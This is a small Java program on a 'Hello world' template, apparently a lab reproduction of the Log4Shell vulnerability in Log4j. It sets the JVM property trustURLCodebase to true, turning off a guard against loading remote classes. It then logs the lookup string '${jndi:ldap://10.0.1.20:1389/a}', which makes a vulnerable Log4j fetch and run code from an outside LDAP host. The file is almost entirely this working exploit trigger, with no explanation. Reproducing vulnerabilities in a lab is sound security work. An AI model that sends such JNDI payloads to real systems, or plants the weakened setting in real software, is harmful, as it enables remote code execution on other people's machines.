package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Hello world!
 *
 */
public class App 
{
    public static void main( String[] args )
    {
        String v = System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase");
        System.out.println(v);
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        Logger log = LogManager.getLogger(App.class);
        log.error("${jndi:ldap://10.0.1.20:1389/a}");

    }
}
